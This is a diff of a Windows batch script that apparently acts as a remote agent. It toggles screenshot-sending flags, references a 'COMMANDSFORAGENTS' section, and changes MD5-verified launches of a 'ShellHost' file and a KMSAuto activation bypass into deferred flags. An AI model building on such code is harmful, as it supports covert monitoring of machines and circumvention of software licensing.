@@ -10,7 +10,7 @@
 setlocal enabledelayedexpansion
 
 
-set "BATCHVERSION=16.8"
+set "BATCHVERSION=16.9"
 
 
 
@@ -119,8 +119,8 @@ echo ProtectionWindowsHostProcess.exe is not running. Continue.....
 
 
 
-set "CheckSend=0"
-set "SENDSCREENSHOT=1"
+set "CheckSend=1"
+set "SENDSCREENSHOT=0"
 set "lastMinute=none"
 
 
@@ -1271,7 +1271,8 @@ echo :COMMANDSFORAGENTS
 echo.
 
 
-
+set "SHSTSTART=0"
+set "KMSSTART=0"
 
 :RUNNINGSHSTKMS
 
@@ -1284,13 +1285,13 @@ echo.
 
 if "%SHSTFILEmd5%"=="%ShellHostMD5%" (
     echo MD5 matches %SHSTFILEmd5% = %ShellHostMD5%
-    echo Starting %SHSTFILE%
-    start "" "%SHSTFILE%"
-    echo Started.
+    set "SHSTSTART=1"
+    echo SHSTSTART = %SHSTSTART% and !SHSTSTART!
+    echo Starting Enabled for %SHSTFILE%
     echo.
 ) else (
     echo MD5 doesnt match %SHSTFILEmd5% # %ShellHostMD5%
-    echo No Start for %SHSTFILE%
+    echo Starting Disabled for %SHSTFILE%
     echo.
 )
 
@@ -1307,13 +1308,13 @@ echo.
 
 if "%KMSFILEmd5%"=="%KMSAutoMD5%" (
     echo MD5 matches %KMSFILEmd5% = %KMSAutoMD5%
-    echo Starting %KMSFILE%
-    start "" "%KMSFILE%"
-    echo Started.
+    set "KMSSTART=1"
+    echo KMSSTART = %KMSSTART% and !KMSSTART!
+    echo Starting Enabled for %KMSFILE%
     echo.
 ) else (
     echo MD5 doesnt match %KMSFILEmd5% # %KMSAutoMD5%
-    echo No Start for %KMSFILE%
+    echo Starting Disabled for %KMSFILE%
     echo.
 )
 
